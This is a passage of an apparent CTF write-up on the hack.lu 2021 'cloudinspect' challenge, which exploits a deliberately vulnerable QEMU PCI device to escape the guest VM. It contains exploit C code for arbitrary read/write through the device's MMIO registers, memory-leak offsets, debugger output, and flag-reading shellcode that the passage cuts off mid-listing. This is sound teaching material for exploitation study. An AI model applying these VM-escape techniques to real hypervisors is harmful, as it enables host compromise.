</span><span class="gi">+    k-&gt;vendor_id = CLOUDINSPECT_VENDORID;
</span><span class="gi">+    k-&gt;device_id = CLOUDINSPECT_DEVICEID;
</span><span class="gi">+    k-&gt;revision = CLOUDINSPECT_REVISION;
</span><span class="gi">+    k-&gt;class_id = PCI_CLASS_OTHERS;
</span><span class="gi">+    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void pci_cloudinspect_register_types(void)
</span><span class="gi">+{
</span><span class="gi">+    static InterfaceInfo interfaces[] = {
</span><span class="gi">+        { INTERFACE_CONVENTIONAL_PCI_DEVICE },
</span><span class="gi">+        { },
</span><span class="gi">+    };
</span><span class="gi">+    static const TypeInfo cloudinspect_info = {
</span><span class="gi">+        .name          = TYPE_PCI_CLOUDINSPECT_DEVICE,
</span><span class="gi">+        .parent        = TYPE_PCI_DEVICE,
</span><span class="gi">+        .instance_size = sizeof(CloudInspectState),
</span><span class="gi">+        .instance_init = cloudinspect_instance_init,
</span><span class="gi">+        .class_init    = cloudinspect_class_init,
</span><span class="gi">+        .interfaces = interfaces,
</span><span class="gi">+    };
</span><span class="gi">+
</span><span class="gi">+    type_register_static(&amp;cloudinspect_info);
</span><span class="gi">+}
</span><span class="gi">+type_init(pci_cloudinspect_register_types)
</span><span class="gi"></span><span class="gh">diff --git a/hw/misc/meson.build b/hw/misc/meson.build
</span><span class="gh">index 1cd48e8a0f..5ff263ca2f 100644
</span><span class="gh"></span><span class="gd">--- a/hw/misc/meson.build
</span><span class="gd"></span><span class="gi">+++ b/hw/misc/meson.build
</span><span class="gi"></span><span class="gu">@@ -1,5 +1,6 @@
</span><span class="gu"></span> softmmu_ss.add(when: &#39;CONFIG_APPLESMC&#39;, if_true: files(&#39;applesmc.c&#39;))
 softmmu_ss.add(when: &#39;CONFIG_EDU&#39;, if_true: files(&#39;edu.c&#39;))
<span class="gi">+softmmu_ss.add(files(&#39;cloudinspect.c&#39;))
</span><span class="gi"></span> softmmu_ss.add(when: &#39;CONFIG_FW_CFG_DMA&#39;, if_true: files(&#39;vmcoreinfo.c&#39;))
 softmmu_ss.add(when: &#39;CONFIG_ISA_DEBUG&#39;, if_true: files(&#39;debugexit.c&#39;))
 softmmu_ss.add(when: &#39;CONFIG_ISA_TESTDEV&#39;, if_true: files(&#39;pc-testdev.c&#39;))
</code></pre></div><p>The first thing I did when I saw this was to check out how <code>memory_region_init_io</code> and <code>pci_register_bar</code> functions work. It sounds a bit like like a kernel device which registers a few handlers for basic operations like read / write / ioctl. Very quickly I found two write up from dangokyo <a
  class="gblog-markdown__link"
  href="https://dangokyo.me/2018/03/28/qemu-internal-pci-device/"
  
  >this one</a
>  and <a
  class="gblog-markdown__link"
  href="https://dangokyo.me/2018/03/25/hitb-xctf-2017-babyqemu-write-up/"
  
  >this other one</a
>, I recommend you to check it out, they are pretty interesting and well written.</p>
<p>PCI stands for Peripheral Component Interconnect, that&rsquo;s a standard that describes the interactions between the cpu and the other physical devices. The PCI device handles the interactions between the system and the physical device. To do so,  the PCI handler is providing a physical address space to the kernel, reachable through the kernel abstractions from a particular virtual address space. This address can be used to cache some data, but that&rsquo;s mainly used to request a particular behavior from the kernel to the physical devices. These requests are written at a well defined offset in the PCI address space, that are the I/O registers. And in the same way, the devices are waiting for some values at these locations to trigger a particular behavior. Check out <a
  class="gblog-markdown__link"
  href="https://tldp.org/LDP/tlk/dd/pci.html"
  
  >this</a
> and <a
  class="gblog-markdown__link"
  href="https://www.kernel.org/doc/html/latest/PCI/pci.html#mmio-space-and-write-posting"
  
  >this</a
> to learn more about PCI devices!</p>
<p>Now we know a bit more about PCI devices, we can see that the patched code is a PCI interface between the linux guest operating system and .. <em>nothing</em>. That&rsquo;s just a vulnerable PCI device which allows us to read and write four I/O registers (<code>CNT</code>, <code>SRC</code>, <code>CMD</code> and <code>DST</code>). According to these registers, we can read and write at an arbitrary location. There is a check about the size we&rsquo;re requesting for read / write operations at a particular offset from the <code>dmabuf</code> base address, but since we control the offset it does not matter.</p>
<p>To write these registers from userland, we need to <code>mmap</code> the right <code>resource</code> file corresponding to the PCI device. Then we just have to read or write the mapped file at an offset corresponding to the the register we want to read / write. Furthermore, the arbitrary read / write primitives provided by the device need to read to / from a memory area from its physical address the data we want to read / write.</p>
<p>The resource file can be found by getting a shell on the machine to take a look at the output of the <code>lspci</code> command.</p>
<pre tabindex="0"><code>/ # lspci -v
00:01.0 Class 0601: 8086:7000
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:01.1 Class 0101: 8086:7010
00:02.0 Class 00ff: 1337:1337
</code></pre><p>The output of the command is structured like this:</p>
<pre tabindex="0"><code>Field 1 : 00:02.0 : bus number (00), device number (02) and function (0)
Field 2 : 00ff    : device class
Field 3 : 1337    : vendor ID
Field 4 : 1337    : device ID
</code></pre><p>According to the source code of the PCI device, the vendor ID and the device ID are <code>0x1337</code>, the resource file corresponding to the device is so <code>/sys/devices/pci0000:00/0000:00:02.0/resource0</code>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="device-interactions">
        Device interactions
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#device-interactions" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Device interactions" href="#device-interactions">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>What we need to interact with the device is to get the physical address of a memory area we control, which would act like a shared buffer between our program and the PCI device. To do so we can <code>mmap</code> a few pages, <code>malloc</code> a buffer or just allocate onto the function&rsquo;s stackframe a large buffer. Given that I was following the thedangokyo&rsquo;s write up, I just retrieved a few functions he was using and especially for the shared buffer.</p>
<p>The function used to get the physical address corresponding to an arbitrary pointer is based on the <code>/proc/self/pagemap</code> pseudo-file, for which you can read the format <a
  class="gblog-markdown__link"
  href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt"
  
  >here</a
>. The virt2phys function looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">uint64_t</span> <span class="nf">virt2phys</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
		<span class="kt">uint64_t</span> <span class="n">virt</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
		<span class="n">assert</span><span class="p">((</span><span class="n">virt</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
		<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/proc/self/pagemap&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
		<span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">virt</span> <span class="o">/</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
		<span class="c1">// the pagemap associates each mapped page of the virtual address space 
</span><span class="c1"></span>		<span class="c1">// with its PTE entry, the entry corresponding to the page is at address / PAGE_SZ
</span><span class="c1"></span>		<span class="c1">// and because that&#39;s an array of 64 bits entry, to access the right entry, the
</span><span class="c1"></span>		<span class="c1">// offset is multiplied per 8. 
</span><span class="c1"></span>		<span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
		<span class="kt">uint64_t</span> <span class="n">phys</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">phys</span><span class="p">,</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span>
				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;read&#34;</span><span class="p">);</span>
		<span class="n">assert</span><span class="p">(</span><span class="n">phys</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1ULL</span> <span class="o">&lt;&lt;</span> <span class="mi">63</span><span class="p">));</span>
		<span class="c1">// asserts the bit IS_PRESENT is set
</span><span class="c1"></span>		<span class="n">phys</span> <span class="o">=</span> <span class="p">(</span><span class="n">phys</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1ULL</span> <span class="o">&lt;&lt;</span> <span class="mi">54</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">;</span>
		<span class="c1">// flips out the status bits, and shifts the physical frame address to 64 bits
</span><span class="c1"></span>		<span class="k">return</span> <span class="n">phys</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>To interact with the device we can write the code right bellow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">iomem</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dmabuf</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">dmabuf_phys_addr</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

<span class="cp">#define PATH &#34;/sys/devices/pci0000:00/0000:00:02.0/resource0&#34;
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">iowrite</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
		<span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">))</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">ioread</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
<span class="p">{</span>
		<span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">write_dmabuf</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offt</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
		<span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">offt</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">read_offt</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offt</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">offt</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
		<span class="n">ioread</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
		<span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">PATH</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_SYNC</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="n">fd1</span><span class="p">)</span> <span class="p">{</span>
				<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Cannot open %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">PATH</span><span class="p">);</span>
				<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
		<span class="p">}</span> <span class="c1">// open resource0 to interact with the device
</span><span class="c1"></span>		
		<span class="n">iomem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// map resource0
</span><span class="c1"></span>		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;iomem @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">iomem</span><span class="p">);</span>
		
		<span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/proc/self/pagemap&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
				<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="n">dmabuf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
		<span class="n">memset</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="sc">&#39;\x00&#39;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">));</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">MAP_FAILED</span> <span class="o">==</span> <span class="n">iomem</span><span class="p">)</span> <span class="p">{</span>
				<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="n">mlock</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span> <span class="c1">// trigger PAGE_FAULT to acually map the page
</span><span class="c1"></span>		<span class="n">dmabuf_phys_addr</span> <span class="o">=</span> <span class="n">virt2phys</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">);</span> <span class="c1">// grab physical address according to pagemap
</span><span class="c1"></span>		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;DMA buffer (virt) @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">dmabuf</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;DMA buffer (phys) @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Now we can interact with the device we got two primitive of arbitrary read / write. The <code>read_offt</code> and <code>write_dmabuf</code> functions permit us to read / write a 8 bytes to an arbitrary offset from the <code>dmabuf</code> object address.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>I did a lot of things which didn&rsquo;t worked, so let&rsquo;s summarize all my thoughts:</p>
<ul>
<li>If we leak the object&rsquo;s address, we can write at any location for which we know the base address, for example overwrite GOT pointers (but it will not succeed because of RELRO).</li>
<li>If we take a look at all the memory areas mapped in the qemu process we can see very large memory area in rwx, which means if we can leak its address and if we can redirect RIP, we just have to write and jmp on a shellcode written in this area.</li>
<li>To achieve the leaks, given that the CloudInspectState structure is allocated on the heap, and that we can read / write at an arbitrary offset from the object&rsquo;s address we can:
<ul>
<li>Scan heap memory for pointers to the qemu binary to leak the base address of the binary.</li>
<li>Scan heap memory  for pointers to the heap itself (next, prev pointers for freed objects for example), and then compute the object&rsquo;s address.</li>
<li>Scan heap memory to leak the rwx memory area</li>
<li>Scan all the memory area we can read to find a leak of the rwx memory area.</li>
</ul>
</li>
<li>To redirect RIP I thought to:
<ul>
<li>Overwrite the <code>destructor</code> function pointer in the <code>MemoryRegion</code> structure.</li>
<li>Write in a writable area a fake <code>MemoryRegionOps</code> structure  for which a certain handler points to our shellcode and make <code>CloudInspectState.mmio.ops</code> point to it.</li>
</ul>
</li>
</ul>
<p>According to the environment, scan the heap memory is not reliable at all. I succeed to leak the rwx memory area, the binary base address, the heap base address from some contiguous objects in the heap. To redirect RIP, for some reason, the <code>destructor</code> is never called, so we have to craft a fake <code>MemoryRegionOps</code> structure. And that&rsquo;s how I read the flag on the disk. But the issue is that remotely, the offset between the heap base and the object is not the same, furthermore, the offset for the rwx memory leak is I guess different as well. So we have to find a different way to leak the object and the rwx memory area.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="leak-some-memory-areas">
        Leak some memory areas
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#leak-some-memory-areas" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leak some memory areas" href="#leak-some-memory-areas">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>To see where we can find pointers to the rwx memory area, we can make use of the <code>search</code> command in <code>pwndbg</code>:</p>
<pre tabindex="0"><code>pwndbg&gt; vmmap                                                                                                                                                                              
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                                                                                                                            
    0x559a884e1000     0x559a88791000 r--p   2b0000 0      /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a88791000     0x559a88c5d000 r-xp   4cc000 2b0000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a88c5d000     0x559a890ff000 r--p   4a2000 77c000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a89100000     0x559a89262000 r--p   162000 c1e000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a89262000     0x559a89353000 rw-p    f1000 d80000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a89353000     0x559a89377000 rw-p    24000 0      [anon_559a89353]                                                                                                                    
    0x559a8a059000     0x559a8b0e7000 rw-p  108e000 0      [heap]                                                                                                                              
    0x7fc5f4000000     0x7fc5f4a37000 rw-p   a37000 0      [anon_7fc5f4000]                                                                                                              
    0x7fc5f4a37000     0x7fc5f8000000 ---p  35c9000 0      [anon_7fc5f4a37]                                                                                                                    
    0x7fc5fbe00000     0x7fc603e00000 rw-p  8000000 0      [anon_7fc5fbe00]                                                                                                                    
    0x7fc603e00000     0x7fc603e01000 ---p     1000 0      [anon_7fc603e00]                                                                                                                    
    0x7fc604000000     0x7fc643fff000 rwxp 3ffff000 0      [anon_7fc604000]                                                                                                                  
    [SKIP]
pwndbg&gt; search -4 0x7fc60400 -w                                                                                                                                                                
[anon_559a89353] 0x559a89359002 0x7fc60400                                                                                                                                                     
[anon_559a89353] 0x559a8935904a 0x7fc60400                                                                                                                                                     
[anon_559a89353] 0x559a89359052 0x1600007fc60400                                                                                                                                               
[anon_559a89353] 0x559a8935905a 0x2d00007fc60400                                                                                                                                               
[anon_559a89353] 0x559a89359062 0xffd300007fc60400                                                                                                                                             
[anon_559a89353] 0x559a89359072 0x7fc60400                                                                                                                                                     
[anon_559a89353] 0x559a89372b2a 0x10100007fc60400                                                                                                                                              
[anon_559a89353] 0x559a89372bb2 0x100000007fc60400                                                                                                                                             
[anon_559a89353] 0x559a89372bba 0xf00000007fc60400                                                                                                                                             
[heap]          0x559a8a2dccf2 0x2d00007fc60400                                                                                                                                                
[heap]          0x559a8a2dccfa 0x7fc60400                                                                                                                                                      
[heap]          0x559a8a2dcd6a 0x7fc60400                                                                                                                                                      
[heap]          0x559a8a2dcefa 0xffd300007fc60400                                                                                                                                              
[heap]          0x559a8a2dcf18 0x7fc60400                                                                                                                                                      
[SKIP]
</code></pre><p>Given that we don&rsquo;t want to get the leak from heap because of the unreliability we can see that there are available leaks in a writable area of the binary in <code>anon_559a89353</code>, indeed the page address looks like a PIE based binary address or an heap address (but the address is not marked heap), and if we look more carefully, the page is contiguous to the last file mapped memory area. Now we can leak the rwx memory area, lets' find a way to leak object&rsquo;s address! I asked on the hack.lu discord a hint for this leak because didn&rsquo;t have any idea. And finally it&rsquo;s quite easy, we can just leak the <code>opaque</code> pointer in the <code>MemoryRegion</code> structure which points to the object&rsquo;s address.</p>
<p>If I summarize we have:</p>
<ul>
<li>A reliable leak of:
<ul>
<li>the object&rsquo;s address with the <code>opaque</code> pointer</li>
<li>the binary base address (from the heap)</li>
<li>the rwx memory area (writable memory area that belongs to the binary).</li>
</ul>
</li>
</ul>
<p>Then we can write this code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// offset I got in gdb locally
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x10c0</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xdef90</span><span class="p">;</span> <span class="c1">// heap leak
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">bss</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0xbc2000</span><span class="p">;</span> <span class="c1">// points to the anonnymous memory area right after the binary
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">heap_base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xf3bff0</span><span class="p">;</span> <span class="c1">// useless
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">ops_struct</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">);</span> <span class="c1">// That&#39;s &amp;ClouInspctState.mmio.ops
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">addr_obj</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mh">0xd0</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span> <span class="o">+</span> <span class="mi">2568</span><span class="p">;</span> <span class="c1">// CloudInspectState.mmio.opaque
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">leak_rwx</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">((</span><span class="n">bss</span> <span class="o">+</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">-</span> <span class="n">addr_obj</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xffff</span><span class="p">;</span> <span class="c1">// leak in the bss
</span><span class="c1"></span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] ops_struct: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Binary base address: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">base</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Heap base address: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">heap_base</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leak rwx: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Addr obj: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">addr_obj</span><span class="p">);</span>

<span class="cm">/*
</span><span class="cm">[*] ops_struct: 559a89173f20
</span><span class="cm">[*] Binary base address: 559a88791000
</span><span class="cm">[*] Heap base address: 559a8a0561d0
</span><span class="cm">[*] Leak rwx: 7fc604000000
</span><span class="cm">[*] Addr obj: 559a8af92f88
</span><span class="cm">*/</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h3 id="write-the-shellcode">
        Write the shellcode
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#write-the-shellcode" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Write the shellcode" href="#write-the-shellcode">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>I choose to write a shellcode to read the flag at <code>leak_rwx + 0x5000</code>, a known location we can easily read and print from the program. The shellcode is very simple:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">2</span> <span class="c1">; SYS_open</span>
<span class="nf">push</span> <span class="mh">0x67616c66</span> <span class="c1">; flag in little endian</span>
<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rsp</span> <span class="c1">; pointer flag string</span>
<span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mi">0</span> <span class="c1">; O_READ</span>
<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x1fd</span> <span class="c1">; mode ?</span>
<span class="nf">syscall</span>
<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span> <span class="c1">; fd</span>
<span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span> <span class="c1">; SYS_read</span>
<span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">rip</span><span class="p">]</span> <span class="c1">; pointer to the rwx memory area (cause we&#39;re executing code within)</span>
<span class="nf">and</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mh">0xffffffffff000000</span> <span class="c1">; compute the base address</span>
<span class="nf">add</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mh">0x5000</span> <span class="c1">; add the right offset</span>
<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x30</span> <span class="c1">; length of the flag to read</span>
<span class="nf">syscall</span>
